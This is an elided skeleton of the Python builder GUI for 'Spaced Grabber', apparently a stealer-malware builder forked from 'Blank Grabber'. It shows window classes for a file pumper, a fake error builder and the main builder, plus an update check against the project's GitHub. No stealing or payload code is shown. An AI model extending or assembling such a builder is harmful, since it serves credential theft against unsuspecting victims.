		...
		if Settings.UpdatesCheck:
			...
			if os.path.isfile(hashFilePath):
				...
				try:
					...
					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/kanata-05/Spaced-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
...
class BuilderOptionsFrame(ctk.CTkFrame):
	...
	def __init__(self, master) -> None:
		...
		self.font = ctk.CTkFont(family='Alex Brush', size=20)
...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("Spaced Grabber [File Pumper]")
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Spaced Grabber [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
		self.grab_set()
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("Spaced Grabber [Builder]")
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Spaced Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
...
if __name__ == "__main__":
	...
	if os.name == "nt":
		...
		# Temp Removed, Will be added once updates are done
		'''
		if Utility.CheckForUpdates():
			...
			if response:
				webbrowser.open_new_tab("https://www.github.com/kanata-05/Spaced-Grabber")
				exit(0)
		'''
